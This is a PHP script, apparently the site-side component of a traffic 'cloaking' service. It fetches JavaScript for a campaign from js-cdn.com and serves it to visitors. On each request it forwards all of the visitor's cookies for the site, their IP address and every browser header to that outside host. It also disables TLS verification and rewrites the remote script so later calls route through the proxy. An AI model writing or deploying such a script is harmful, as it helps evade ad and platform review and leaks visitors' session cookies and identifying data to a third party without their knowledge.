<?php
	header('Content-Type: application/javascript');

	$campaignId = '278ged';
	$phpUrl = (is_https() ? "https://" : "http://"). $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];

	function is_https()
	{
		if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) === 'on')
		{
		  return TRUE;
		}
		elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')
		{
		  return TRUE;
		}
		elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && $_SERVER['HTTP_FRONT_END_HTTPS'] === 'on')
		{
		  return TRUE;
		}
		return FALSE;
	}
	function browser_headers()
    {
        $headers = array();

        foreach ($_SERVER as $name => $value) {
            if (preg_match('/^HTTP_/', $name)) {
                $headers[$name] = $value;
            }
        }

        return $headers;
    }
	function forward_response_cookies($ch, $headerLine)
	{
	    if (preg_match('/^Set-Cookie:/mi', $headerLine, $cookie)) {
	        header($headerLine, false);
	    }

	    return strlen($headerLine); // Needed by curl
	}

	function encode_visitor_cookies()
	{
	    $transmit_string = "";

	    foreach ($_COOKIE as $name => $value) {
	        try {
	            $transmit_string .= "$name=$value; ";
	        } catch (Exception $e) {
	            continue;
	        }
	    }

	    return $transmit_string;
	}

	function send_request($url)
	{
		$ch = curl_init($url);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

        curl_setopt($ch, CURLOPT_ENCODING, "");
		$headers[] = "API-forwarded-ip: ".$_SERVER['REMOTE_ADDR'];
		$headers[] = "API-forwarded-header: " . json_encode(browser_headers());
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, "forward_response_cookies");

        if ($_COOKIE) {
            curl_setopt($ch, CURLOPT_COOKIE, encode_visitor_cookies());
        }
		$cloaker_response = curl_exec($ch);

		curl_close($ch);
		return $cloaker_response;
	}

	preg_match('|d=([^&]*)|', $_SERVER['REQUEST_URI'], $matches);

	if(!empty($matches[1])) {
		$parameters = base64_decode($matches[1]);
		$parameters = json_decode($parameters, true);

		$query_url = "https://js-cdn.com/js/".$campaignId.".js?d={$matches[1]}";
		$response = send_request($query_url);
	} else {
		$query_url = "https://js-cdn.com/js/".$campaignId.".js";
		$response = send_request($query_url);
		$response = str_replace('return t + "?d="', 'return "'.$phpUrl.'?d="', $response);
	}
	echo $response;
	exit;
?>
